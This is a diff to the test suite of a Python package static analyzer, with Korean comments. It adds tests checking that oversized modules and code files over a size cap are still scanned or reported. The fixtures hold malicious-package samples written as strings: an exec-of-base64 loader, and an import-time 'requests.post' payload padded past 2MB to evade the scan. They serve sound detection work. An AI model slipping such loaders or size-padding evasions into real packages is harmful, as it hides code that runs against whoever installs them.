@@ -734,8 +734,29 @@ def test_oversized_setup_py_is_still_scanned():
     pad = "#" + "x" * (3 * 1024 * 1024) + "\n"
     src = "from base64 import b64decode\nexec(b64decode(P).decode())\n" + pad
     assert RULE_OBFUSCATED in _high_rules({"p-1/setup.py": src})
-    # 진입점이 아닌 큰 모듈은 예전처럼 건너뛴다 (생성된 표·데이터)
-    assert _high_rules({"p-1/pkg/table.py": src}) == set()
+
+
+def test_oversized_module_imported_by_init_is_still_scanned():
+    """진입점이 아닌 모듈도 2MB 를 넘겼다고 빠지면 안 된다 — __init__ 이 import 하는 모듈에
+    페이로드를 넣고 부풀리면 검사에서 사라지는 우회로였다."""
+    pad = "#" + "x" * (3 * 1024 * 1024) + "\n"
+    files = {"p-1/setup.py": "", "p-1/pkg/__init__.py": "from . import payload\n",
+             "p-1/pkg/payload.py": "import requests\nrequests.post('http://x')\n" + pad}
+    assert RULE_INSTALL_TIME in _high_rules(files)
+
+
+def test_code_file_over_the_cap_is_reported_not_skipped(monkeypatch):
+    from engine import static_analyzer as sa
+
+    monkeypatch.setattr(sa, "MAX_CODE_BYTES", 100)
+    unreadable: list[str] = []
+    files = {"p-1/pkg/__init__.py": "x = 1\n" * 50, "p-1/data.txt": "y" * 5000}
+    sa.analyze_files(files, unreadable=unreadable)
+    assert unreadable == ["p-1/pkg/__init__.py" + sa.OVERSIZED_MARK]  # .txt 는 데이터라 조용히
+    [msg] = sa.unreadable_errors(unreadable)
+    assert msg.startswith("static: ") and "p-1/pkg/__init__.py" in msg and "상한" in msg
+    # 읽기 실패와 함께 오면 문구가 둘로 나뉜다
+    assert len(sa.unreadable_errors([*unreadable, "p-1/a.py"])) == 2
 
 
 # ── held-out 에서 놓친 두 계열 ──────────────────────────────────────
